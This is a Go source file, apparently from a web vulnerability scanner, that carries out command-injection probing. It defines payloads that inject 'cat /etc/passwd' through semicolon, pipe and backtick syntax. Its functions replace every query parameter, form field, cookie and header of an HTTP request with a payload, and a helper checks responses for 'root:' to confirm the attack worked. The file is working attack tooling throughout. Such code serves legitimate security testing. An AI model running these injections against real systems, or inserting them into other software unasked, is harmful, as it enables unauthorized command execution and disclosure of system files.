package commandinjection

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"
)

const semicolonString = ";cat /etc/passwd;"
const pipelineString = "|cat /etc/passwd|"
const appostrofString = "`cat /etc/passwd`"

func TryInjectionSemicolon(req *http.Request) (*http.Request, error) {

	req.URL.RawQuery = strings.ReplaceAll(req.URL.RawQuery, ";", "&")
	getParams := req.URL.Query()
	for key, _ := range getParams {
		getParams[key][0] = semicolonString
	}
	req.URL.RawQuery = url.Values(getParams).Encode()

	err := req.ParseForm()
	if err != nil {
		return nil, err
	}

	postParams := req.PostForm
	for key, _ := range postParams {
		postParams[key][0] = semicolonString
	}

	req.Body = io.NopCloser(strings.NewReader(postParams.Encode()))

	for _, cookie := range req.Cookies() {
		req.AddCookie(&http.Cookie{Name: cookie.Name, Value: semicolonString})
	}

	headers := req.Header
	for key, _ := range headers {
		headers[key][0] = semicolonString
	}
	req.Header = headers

	return req, nil
}

func TryInjection(req *http.Request, injectionString string) (*http.Request, error) {

	req.URL.RawQuery = strings.ReplaceAll(req.URL.RawQuery, ";", "&")
	getParams := req.URL.Query()
	for key, _ := range getParams {
		getParams[key][0] = injectionString
	}
	req.URL.RawQuery = url.Values(getParams).Encode()

	err := req.ParseForm()
	if err != nil {
		return nil, err
	}

	postParams := req.PostForm
	for key, _ := range postParams {
		postParams[key][0] = injectionString
	}

	req.Body = io.NopCloser(strings.NewReader(postParams.Encode()))

	for _, cookie := range req.Cookies() {
		req.AddCookie(&http.Cookie{Name: cookie.Name, Value: injectionString})
	}

	headers := req.Header
	for key, _ := range headers {
		headers[key][0] = injectionString
	}
	req.Header = headers

	return req, nil
}

func HasRoot(body []byte) bool {
	return bytes.Contains(body, []byte("root:"))
}
